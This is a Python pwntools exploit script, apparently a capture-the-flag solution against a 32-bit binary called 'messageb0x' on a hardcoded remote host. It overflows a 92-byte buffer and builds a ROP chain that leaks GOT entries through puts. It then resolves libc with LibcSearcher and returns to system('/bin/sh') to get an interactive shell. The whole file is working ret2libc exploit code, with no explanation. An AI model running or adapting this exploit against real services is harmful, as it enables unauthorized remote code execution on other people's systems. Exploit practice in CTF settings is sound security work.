from pwn import *
from LibcSearcher import *

debug = 0
context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(proc.pidof(p)[0])

def init():
    p.recvuntil("Plz tell me who you are:")
    p.sendline("LambdaX")
    p.recvuntil("Plz tell me your email address:")
    p.sendline("LambdaX")
    p.recvuntil("Plz tell me what do you want to say:")

elf = ELF('messageb0x')
libc_start_main_got = elf.got['__libc_start_main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
jump = 0x0804934d
process_info = 0x0804923b

if debug:
    p = process("./messageb0x")
else:
    p = remote("101.71.29.5", 10000)

init()
payload = 'A' * 92 + p32(puts_plt) + p32(process_info) + p32(libc_start_main_got)
p.sendline(payload)
p.recvuntil("you !\n")
libc_start_main_addr = u32(p.recvline()[:4])
print '__libc_start_main: ' + hex(libc_start_main_addr)
obj = LibcSearcher("__libc_start_main", libc_start_main_addr)

init()
payload = 'A' * 92 + p32(puts_plt) + p32(process_info) + p32(puts_got)
p.sendline(payload)
p.recvuntil("you !\n")
puts_addr = u32(p.recvline()[:4])
print 'puts_addr: ' + hex(puts_addr)
print "Searching ... Wait a second..."
obj = LibcSearcher("puts", puts_addr)
obj.add_condition("puts", puts_addr)

libc_base = puts_addr - obj.dump("puts")
system_addr = libc_base + obj.dump("system")
bin_sh_addr = libc_base + obj.dump("str_bin_sh")
print "System: " + hex(system_addr) + "; sh: " + hex(bin_sh_addr)

init()
payload = 'A' * 92 + p32(system_addr) + p32(jump) + p32(bin_sh_addr)
p.sendline(payload)
p.interactive()
